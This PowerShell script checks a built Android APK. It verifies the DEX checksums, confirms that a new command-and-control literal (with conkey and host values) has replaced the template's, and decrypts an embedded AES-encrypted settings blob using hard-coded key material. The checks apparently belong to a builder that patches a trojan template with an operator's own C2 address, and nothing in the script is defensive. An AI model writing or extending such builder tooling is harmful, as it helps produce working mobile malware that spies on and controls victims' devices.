# Validate the built APK: DEX header integrity + patched literals + payload config decoding.
param([string]$ApkPath)

Add-Type -AssemblyName System.IO.Compression.FileSystem
$zip = [System.IO.Compression.ZipFile]::OpenRead($ApkPath)
$e = $zip.GetEntry("classes.dex")
$ms = New-Object System.IO.MemoryStream
$e.Open().CopyTo($ms)
$zip.Dispose()
$dex = $ms.ToArray()
Write-Output ("dex size: {0}" -f $dex.Length)

# magic
$magic = [System.Text.Encoding]::ASCII.GetString($dex[0..7])
Write-Output "magic: $magic"

# adler32 over [12..end]
$a = 1; $b = 0
for ($i = 12; $i -lt $dex.Length; $i++) {
	$a = ($a + $dex[$i]) % 65521
	$b = ($b + $a) % 65521
}
$sum = ($b -shl 16) -bor $a
$stored = [BitConverter]::ToUInt32($dex, 8)
Write-Output ("adler32: computed={0} stored={1} match={2}" -f $sum, $stored, ($sum -eq $stored))

# sha1 over [32..end]
$sha1 = [System.Security.Cryptography.SHA1]::Create()
$h = $sha1.ComputeHash($dex, 32, $dex.Length - 32)
$storedSig = $dex[12..31]
$match = $true
for ($i = 0; $i -lt 20; $i++) { if ($h[$i] -ne $storedSig[$i]) { $match = $false; break } }
Write-Output ("sha1: match=$match")

# literals
function Find-Literal($needleStr) {
	$needle = [System.Text.Encoding]::UTF8.GetBytes($needleStr)
	for ($i = 0; $i -le $dex.Length - $needle.Length; $i++) {
		$ok = $true
		for ($j = 0; $j -lt $needle.Length; $j++) { if ($dex[$i+$j] -ne $needle[$j]) { $ok = $false; break } }
		if ($ok) { return $i }
	}
	return -1
}

# expected new C2 literal for conkey=iza3a, hosts=www.google.com<insect.kingdom.brother
$c2Plain = "iza3a[<s>]www.google.com<insect.kingdom.brother[<s>]T"
$c2Lit = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($c2Plain)) + "|"
$at = Find-Literal $c2Lit
Write-Output ("C2 literal '{0}' found at {1}" -f $c2Lit, $at)

# tag literal: prefix + "test"
$tagLit = "oltsfhxzoffaynqemztewstest"
$at2 = Find-Literal $tagLit
Write-Output ("tag literal found at: $at2")

# old template literals should be gone
$tpl = Find-Literal "aXphM2FbPHM+XXd3dy5nb29nbGUuY29tWzxzPl1pbnNlY3Qua2luZ2RvbS5icm90aGVyWzxzPl1U"
Write-Output ("template C2 literal still present at: $tpl (should be -1)")

# settings blob: extract at 1427555 (same offset as template), stop at first NUL
$blobBytes = $dex[1427555..(1427555+215)]
$nz = 0; while ($nz -lt $blobBytes.Length -and $blobBytes[$nz] -ne 0) { $nz++ }
$blobB64 = [System.Text.Encoding]::ASCII.GetString($blobBytes[0..($nz-1)])
try {
	$kdf = New-Object System.Security.Cryptography.Rfc2898DeriveBytes("4814780584699673", [System.Text.Encoding]::UTF8.GetBytes("2894356330652558"), 65536)
	$key = $kdf.GetBytes(16)
	$aes = [System.Security.Cryptography.Aes]::Create()
	$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
	$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
	$aes.Key = $key
	$aes.IV = [System.Text.Encoding]::UTF8.GetBytes("2230209522049090")
	$dec = $aes.CreateDecryptor()
	$plain = $dec.TransformFinalBlock([Convert]::FromBase64String($blobB64), 0, [Convert]::FromBase64String($blobB64).Length)
	Write-Output ("settings decrypted: " + [System.Text.Encoding]::UTF8.GetString($plain))
} catch {
	Write-Output ("settings decrypt failed: " + $_.Exception.Message)
}
